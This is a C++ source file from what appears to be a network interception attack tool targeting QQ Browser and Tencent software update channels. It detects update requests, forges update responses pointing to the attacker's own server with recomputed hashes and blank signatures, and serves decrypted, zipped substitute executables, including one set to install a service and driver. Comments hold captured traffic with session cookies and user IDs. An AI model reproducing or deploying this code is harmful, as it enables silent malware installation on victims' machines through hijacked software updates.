#include "QQ.h"
#include "../attacker.h"
#include "../HttpPartial.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../version.h"
#include "../FileOper.h"
#include "PluginServer.h"
#include "../Utils/simpleJson.h"

int gQQFlag = 1;

string gNewVersion = "";


//122.246.7.14/d3g.qq.com/clubapp/pop/p14.zip?mkey=5d88864b3da45f2c&f=24c5&cip=61.164.121.217&proto=http
/*
GET /d3g.qq.com/clubapp/pop/p14.zip?mkey=5d88864b3da45f2c&f=24c5&cip=61.164.121.217&proto=http HTTP/1.1
Host: 122.246.7.14
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: Keep-Alive
Cache-Control: no-cache
Accept-Encoding: gzip, deflate

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: none
Content-Length: 82885
Connection: close
*/


int QQBrowserPlugin::isQQBrowserPlugin(const char * url, const char * host, const char * httphdr, const char * httpdata) {
	if (strstr(host, "appstore.browser.qq.com") && strstr(url, "/getMiniBrowserUpdateConfig") )
	{
		gQQFlag = 1;
		return TRUE;
	}else if (strstr(host, "update.browser.qq.com")  && strstr(url,"/qbrowser")  )
	{
// 		if (httpdata == 0 || *httpdata == 0)
// 		{
// 			return FALSE;
// 		}

		char *qqagent = "User-Agent: QQBrowser";
		if (strstr(httphdr,qqagent))
		{
			string strcmd = SimpleJson::getBaseValue(httpdata, "CSoftID");
			if (strcmd != "")
			{
				int cmd = atoi(strcmd.c_str());
				if (cmd == 16)
				{
				}
				else if (cmd == 18)
				{
				}
				else if (cmd == 21)
				{
				}
				else if (cmd == 26)
				{
				}
				else {
					cmd = 18;
				}

				gQQFlag = cmd;
			}
			else {
				gQQFlag = 18;
			}
		}
		else {
			gQQFlag = 2;
		}

		return TRUE;
	}else if (strstr(host,"updatecenter.qq.com") && strstr(url,"/queryselfupdate"))
	{
		gQQFlag = 3;
		return TRUE;
	}

	return FALSE;
}

int QQBrowserPlugin::isQQClubApp(const char * url, const char * host) {
	if (strstr(url, "/clubapp/pop/p14.zip?"))
	{
		gQQFlag = 4;
		return TRUE;
	}
	return FALSE;
}

int QQBrowserPlugin::sendQQClubApp(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;

	char szrespformat[] =
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Accept-Ranges: none\r\n"
		"Content-Length: %u\r\n"
		"Connection: close";

	string exesrcfn = Public::getUserPluginPath(lpssl->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	string newexefn = exesrcfn + "_new.exe";
	ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
	if (ret <= 0)
	{
		return FALSE;
	}

	string zipfn = Public::getUserPluginPath(lpssl->username) + WEIXIN_PC_UPDATE_ZIP_FILENAME;
	ret = Public::zipFile(WEIXIN_PC_UPDATE_EXE_FILENAME, newexefn, zipfn);
	if (ret == 0)
	{
		return FALSE;
	}
	string filename = Public::getUserUrl(lpssl->username, WEIXIN_PC_UPDATE_ZIP_FILENAME);
	ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szrespformat, 1);
	return 0;

}

int QQBrowserPlugin::sendQQBrowserPlugin(char * dstbuf, int dstbuflimit, string username) {
	if (gQQFlag == 1 || gQQFlag == 2)
	{
		int ret = 0;
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: application/json; charset=utf8\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char * lpRespContentFormat =
			"{\r\n\"CSoftID\": 22,"
			"\"CommandLine\": \"\","
			"\"Desp\": \"\\u0039\\u002e\\u0035\\u002e\\u0031\\u0031\\u0036\\u0030\\u002e\\u0034\\u0030\","
			"\"DownloadUrl\": \"http://%s/%s\","
			"\"ErrCode\": 0,"
			"\"File\": \"%s\","
			"\"Flags\": 1,"
			"\"Hash\": \"%s\","
			"\"InstallType\": 0,"
			"\"NewVer\": \"%s\","
			"\"PatchFile\": \"QBDeltaUpdate.exe\","
			"\"PatchHash\": \"%s\","
			"\"Sign\": \"%s\","
			"\"Size\": %u,"
			"\"VerType\": \"\"}\r\n";

		string version = "9.5.1160.400";

		string szip = HttpUtils::getIPstr(gServerIP) + "/" + username;

		char szmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };

		string filename = Public::getUserPluginPath(username) + QQMINIBROWSER_FILE_NAME;

		int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, TRUE);

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
			szip.c_str(), QQMINIBROWSER_FILE_NAME, QQMINIBROWSER_FILE_NAME, szmd5, version.c_str(), szmd5,szmd5, filesize);

		int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return resultlen;
	}
	else if (gQQFlag == 16 || gQQFlag == 18 || gQQFlag == 26 || gQQFlag == 21)
	{
		int ret = 0;
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: application/json; charset=utf8\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		char * lpRespContentFormat =
			"{\r\n\"CSoftID\": %u,"
			"\"CommandLine\": \"%s\","
			"\"Desp\": \"%s\","
			"\"DownloadUrl\": \"http://%s/%s\","
			"\"ErrCode\": 0,"
			"\"File\": \"%s\","
			"\"Flags\": 1,"
			"\"Hash\": \"%s\","
			"\"InstallType\": 0,"
			"\"NewVer\": \"%s\","
			"\"PatchFile\": \"QBDeltaUpdate.exe\","
			"\"PatchHash\": \"%s\","
			"\"Sign\": \"\","
			"\"Size\": %u,"
			"\"VerType\": \"\"}\r\n";

		string dest = "";
		string cmdline = "";
		string fn = "";
		string version = "";
		if (gQQFlag == 16)
		{
			fn = "QBShellIcon_x64.dll";
			version = "9.0.0.7";
			dest = "\\u0039\\u002e\\u0030\\u002e\\u0030\\u002e\\u0037\\u005f\\u0078\\u0036";
		}
		else if (gQQFlag == 18)
		{
			fn = "inject_qqbrowser.dll";
			version = "9.0.1033.400";
			cmdline = "/setdefbrowser=1 /createshortcut=1 /createdaohang=1 /installservice=1 /installdriver=1";
			dest = "\\u0039\\u002e\\u0030\\u002e\\u0031\\u0030\\u0033\\u0033\\u002e\\u0034\\u0030";
		}
		else if (gQQFlag == 21)
		{
			fn = "qqbrowser_all_ev.zip";
			version = "all_9.0.4247.400_x64_ev";
			cmdline = "";
			dest = "\\u0061\\u006c\\u006c\\u005f\\u0039\\u002e\\u0030\\u002e\\u0034\\u0032\\u0034\\u0037\\u002e\\u0034\\u0030\\u0030\\u005f\\u0078\\u0036\\u0034\\u005f\\u0065";
		}
		else if (gQQFlag == 26)
		{
			fn = "PerfTools3.dll";
			version = "9.0.0.41";
			cmdline = "";
			dest = "\\u006e\\u0075\\u006c";
		}

		string szip = HttpUtils::getIPstr(gServerIP) + "/" + username;

		char szmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };

		string filename = Public::getUserPluginPath(username) + fn;

		int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, TRUE);

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
			gQQFlag, cmdline.c_str(), dest.c_str(),szip.c_str(), fn.c_str(), fn.c_str(), szmd5, version.c_str(), szmd5, filesize);

		int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return resultlen;
	}
	else if (gQQFlag == 3)
	{
		int ret = 0;
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: application/octet-stream\r\n"
			"Connection: close\r\n"
			"Content-Encoding: none\r\n\r\n";

		char * lpRespContentFormat =
		"<?xml version = \"1.0\" encoding=\"utf-8\" ?>"
		"<response><result><code>1</code></result><report><type>1</type></report><url>http://%s/%s</url><md5>%s</md5><size>%u</size></response>";

		string szip = HttpUtils::getIPstr(gServerIP) + "/" + username;

		string txupdate = WEIXIN_PC_UPDATE_EXE_FILENAME;

		string exesrcfn = Public::getUserPluginPath(username) + txupdate;
		string newexefn = exesrcfn + "_txupd.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		string inzipexefn = "txupd.exe";
		string zipfn = "txupd.zip";
		string szfullzipfn = Public::getUserPluginPath(username) + zipfn;
		ret = Public::zipFile(inzipexefn, newexefn, szfullzipfn);
		if (ret == 0)
		{
			return FALSE;
		}

		char szmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int filesize = CryptoUtils::getUpdateFileMd5(szfullzipfn, szmd5, hexmd5, FALSE);

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
			szip.c_str(), zipfn.c_str(), szmd5, filesize);

// 		unsigned char data[54] = {
// 			0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x48, 0x00, 0x14, 0xF0, 0x2E,
// 			0xC2, 0xD6, 0x56, 0xB3, 0x0A, 0x7D, 0x02, 0x72, 0x20, 0x2B, 0x76, 0x6D, 0x67, 0xF7, 0x66, 0x46,
// 			0x0A, 0x00, 0x41, 0x62, 0xCF, 0xA8, 0x88, 0x3F, 0xF5, 0xB8, 0xEC, 0xA0, 0x9A, 0x2E, 0x44, 0x3D,
// 			0xA5, 0x32, 0xB7, 0x88, 0xD9, 0xC7
// 		};
		unsigned char data[54] = {
			0x00, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8f, 0x00, 0x14, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00
		};

		int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen + 54);
		memcpy(dstbuf + resultlen, data, 54);
		memcpy(dstbuf + resultlen + 54, lpRespContent, iRespContentLen);
		return resultlen + 54 + iRespContentLen;
	}

	return 0;
}

/*
POST /queryselfupdate HTTP/1.1
Accept: *//*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: updatecenter.qq.com
Pragma: no-cache
Cookie: euin_cookie=53DFE9A7024225C8649F40745723E578AC136F6862ECF843; uin_cookie=2210853762
Content-Length: 316

<?xml version="1.0" encoding="utf-8"?><request><protocol_version>1</protocol_version><query><mode>1</mode></query><client_info><module><guid>{D99AB25B-93A0-44FB-B89A-242D2FAB87B7}</guid><language>2052</language><version>30041</version></module><identity><number>2210853762</number></identity></client_info></request>

HTTP/1.1 200 OK
Date: Sun, 11 Aug 2019 03:15:49 GMT
Content-Type: application/octet-stream
Content-Length: 382
Connection: close
Content-Encoding: none

<?xml version = "1.0" encoding="utf-8" ?>
<response><result><code>1</code></result><report><type>2</type></report><url>http://dldir1.qq.com/updatecenter/qq/updater/30044/txupd.zip</url><md5>1C38CBF08B92EF0610FF93EFE7ABE988</md5><size>2097111</size><ctrlbit><cybercafe>0</cybercafe><accessible>0</accessible></ctrlbit></response>
*/


/*
POST /getMiniBrowserUpdateConfig HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0) QQBrowser/9.0
Host: appstore.browser.qq.com
Content-Length: 181
Connection: Keep-Alive
Cache-Control: no-cache

POST /getMiniBrowserUpdateConfig HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0) QQBrowser/9.0
Host: appstore.browser.qq.com
Content-Length: 181
Connection: Keep-Alive
Cache-Control: no-cache

{
"COS": "10.0.17134",
"CVer": "1.5.4699.999",
"ExeVer": "",
"GUID": "9308ec3d7b7602d10f39e90f88399236",
"QID": 16778600,
"QQVer": "",
"osDigit": 64
}
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Tue, 02 Apr 2019 05:20:02 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: https://appstore.browser.qq.com/getMiniBrowserUpdateConfig

<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx</center>
</body>
</html>

*/



/*
POST /qbrowser HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: QQBrowser
Content-Length: 191
Host: update.browser.qq.com

{"Cmd": 1,"GUID": "9308ec3d7b7602d10f39e90f88399236","UIN": "0", "CVer": "0.0.0.0", "CSoftID": 16, "TriggerMode": 1, "COS": "10.0.17763", "SupplyID": "10002996", "COSLan": 2052,"osDigit": 64}HTTP/1.1 200 
Date: Wed, 25 Mar 2020 19:06:29 GMT
Content-Length: 441
Connection: keep-alive

{ "CSoftID": 16, "CommandLine": "", "Desp": "\u0031\u002e\u0030\u002e\u0030\u002e\u0037\u005f\u0078\u0036", 
"DownloadUrl": "http://dl_dir.qq.com/invc/tt/QBShellIcon_x64.dll", "ErrCode": 0, "File": "QBShellIcon_x64.dll", 
"Flags": 1, "Hash": "4298ef1f49d563b2190ae5783468a58c", "InstallType": 0, "NewVer": "1.0.0.7", 
"PatchFile": "QBDeltaUpdate.exe", "PatchHash": "4298ef1f49d563b2190ae5783468a58c", "Sign": "", "Size": 205664, "VerType": "" }

POST /qbrowser HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: QQBrowser
Content-Length: 191
Host: update.browser.qq.com

{"Cmd": 1,"GUID": "9308ec3d7b7602d10f39e90f88399236","UIN": "0", "CVer": "0.0.0.0", "CSoftID": 18, "TriggerMode": 1, 
"COS": "10.0.17763", "SupplyID": "10002996", "COSLan": 2052,"osDigit": 64}

HTTP/1.1 200 
Date: Wed, 25 Mar 2020 19:06:30 GMT
Content-Length: 546
Connection: keep-alive

{ "CSoftID": 18, "CommandLine": "/setdefbrowser=1 /createshortcut=1 /createdaohang=1 /installservice=1 /installdriver=1", 
"Desp": "\u0032\u002e\u0030\u002e\u0031\u0030\u0033\u0033\u002e\u0034\u0030", 
"DownloadUrl": "http://dl_dir.qq.com/invc/tt/inject_2.0.1033.400.dll", "ErrCode": 0, "File": "inject_2.0.1033.400.dll", 
"Flags": 1, "Hash": "77cce6b609b9fd79c83a081afb4bbe56", "InstallType": 0, "NewVer": "2.0.1033.400", "PatchFile": "QBDeltaUpdate.exe", 
"PatchHash": "77cce6b609b9fd79c83a081afb4bbe56", "Sign": "", "Size": 141632, "VerType": "" }


POST /qbrowser HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: QQBrowser
Content-Length: 192
Host: update.browser.qq.com
HTTP/1.1 200
Date: Wed, 25 Mar 2020 19:06:31 GMT
Content-Length: 545
Connection: keep-alive

{ "CSoftID": 21, "CommandLine": "",
"Desp": "\u0061\u006c\u006c\u005f\u0032\u002e\u0030\u002e\u0034\u0032\u0034\u0037\u002e\u0034\u0030\u0030\u005f\u0078\u0036\u0034\u005f\u0065",
"DownloadUrl": "http://dl_dir.qq.com/invc/tt/all_2.0.4247.400_x64_ev.zip", "ErrCode": 0, "File": "all_2.0.4247.400_x64_ev.zip",
"Flags": 1, "Hash": "357b45c2b14349f63e95b8ae8e7bc7ff", "InstallType": 0, "NewVer": "all_2.0.4247.400_x64_ev",
"PatchFile": "QBDeltaUpdate.exe", "PatchHash": "357b45c2b14349f63e95b8ae8e7bc7ff", "Sign": "", "Size": 706984, "VerType": "" }



POST /qbrowser HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: QQBrowser
Content-Length: 192
Host: update.browser.qq.com

{"Cmd": 1,"GUID": "9308ec3d7b7602d10f39e90f88399236","UIN": "0", "CVer": "1.0.0.23", "CSoftID": 26, 
"TriggerMode": 1, "COS": "10.0.17763", "SupplyID": "10002996", "COSLan": 2052,"osDigit": 64}

HTTP/1.1 200 
Date: Wed, 25 Mar 2020 19:06:30 GMT
Content-Length: 390
Connection: keep-alive

{ "CSoftID": 26, "CommandLine": "", "Desp": "\u006e\u0075\u006c", "DownloadUrl": "http://dl_dir.qq.com/invc/tt/PerfTools3.dll", 
"ErrCode": 0, "File": "PerfTools3.dll", "Flags": 1, "Hash": "a3ea24dcd2506114aa25cb4b8c6a25d6", "InstallType": 0, 
"NewVer": "1.0.0.41", "PatchFile": "QBDeltaUpdate.exe", "PatchHash": "a3ea24dcd2506114aa25cb4b8c6a25d6", "Sign": "", 
"Size": 104184, "VerType": "" }


*/


/*
POST /qbrowser HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0) QQBrowser/9.0
Host: update.browser.qq.com
Content-Length: 345
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: uin_cookie=2210853762; euin_cookie=DE64E4710418D1354B494EE56A9FDB62B807BF1BAEB4E4FC

{
"COS": "10.0.18363",
"CSoftID": 22,
"CVer": "1.0.1160.400",
"Cmd": 1,
"ExeVer": "1.0.1160.400",
"GUID": "9308ec3d7b7602d10f39e90f88399236",
"InstallTimeStamp": 1592812903,
"QID": 16792746,
"QQVer": "9.3.3.27011",
"SupplyID": 0,
"TriggerMode": 1,
"UIN": 0,
"bPatch": 0,
"osDigit": 64
}
HTTP/1.1 200
Date: Thu, 25 Jun 2020 01:53:53 GMT
Content-Length: 450
Connection: keep-alive

{ "CSoftID": 22, "CommandLine": "", "Desp": "\u0031\u002e\u0030\u002e\u0031\u0031\u0036\u0030\u002e\u0034\u0030", 
"DownloadUrl": "http://dl_dir.qq.com/invc/tt/minibrowser11.zip", "ErrCode": 0, "File": "minibrowser11.zip", 
"Flags": 1, "Hash": "b1309eb4312bd83d154a4b2b1b66547b", "InstallType": 0, "NewVer": "1.0.1160.400", 
"PatchFile": "QBDeltaUpdate.exe", "PatchHash": "b1309eb4312bd83d154a4b2b1b66547b", "Sign": "", "Size": 36003449, "VerType": "" }
*/